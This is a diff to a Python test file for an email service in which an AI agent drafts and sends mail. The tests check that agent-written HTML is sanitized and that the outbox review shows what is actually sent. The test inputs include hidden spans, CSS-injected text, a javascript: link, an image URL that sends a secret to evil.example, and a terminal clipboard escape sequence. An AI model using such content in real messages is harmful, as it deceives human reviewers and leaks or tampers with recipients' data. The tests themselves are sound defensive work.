@@ -164,6 +164,39 @@ def test_ai_html_cannot_hide_content_from_review(svc):
     assert "sk" in item["draft"]["body"] and "123" in item["draft"]["body"]
 
 
-def test_html_extra_words():
-    assert compose.html_extra_words("<p>Hello <b>world</b></p>", "Hello **world**") == set()
-    assert compose.html_extra_words("<p>Hello</p><span hidden>secret</span>", "Hello") == {"secret"}
+def test_html_matches_text_is_ordered():
+    from monospace.core.sanitize import html_matches_text
+
+    assert html_matches_text("<p>Hello <b>world</b></p>", "Hello **world**")
+    assert not html_matches_text("<p>Hello</p><span hidden>secret</span>", "Hello")
+    assert not html_matches_text("<p>do not pay</p>", "pay do not")  # same words, other meaning
+
+
+def test_agent_html_is_sanitized_when_sent(svc, sent):
+    svc.account().ai_send = "allow"
+    html = ('<style>p:after{content:"PAY"}</style><p style="color:white">hi</p>'
+            '<img src="https://evil.example/?k=secret"><!--[if mso]>OUTLOOK ONLY<![endif]-->'
+            '<a href="javascript:x()">js</a><a href="https://ok.example">Docs</a>')
+    svc.submit(None, Draft(to=["x@y.com"], subject="s", body="decoy", html_body=html), "ai")
+    sent_html = _parts(sent[0][0].as_bytes())["html"]
+    for bad in ("<style", "color:white", "evil.example", "OUTLOOK", "javascript:"):
+        assert bad not in sent_html
+    assert 'href="https://ok.example"' in sent_html
+    plain = sent[0][0].get_body(("plain",)).get_content()
+    assert "decoy" not in plain and "<https://ok.example>" in plain
+
+
+def test_markdown_raw_html_from_agent_is_sanitized(svc, sent):
+    svc.account().ai_send = "allow"
+    svc.submit(None, Draft(to=["x@y.com"], subject="s",
+                           body='Hi <div style="display:none">hidden</div> <img src="https://t.example/p.gif">'), "ai")
+    sent_html = _parts(sent[0][0].as_bytes())["html"]
+    assert "display:none" not in sent_html and "t.example" not in sent_html and "hidden" in sent_html
+
+
+def test_outbox_review_shows_sent_content_and_strips_escapes(svc):
+    svc.account().ai_send = "confirm"
+    res = svc.submit(None, Draft(to=["x@y.com"], subject="s", body="ok \x1b]52;c;ZXZpbA==\x07 there "
+                                 "[click](https://evil.example)"), "ai")
+    text = svc.outbox_review(svc.store.outbox_get(res.outbox_id))
+    assert "\x1b" not in text and "\x07" not in text and "<https://evil.example>" in text
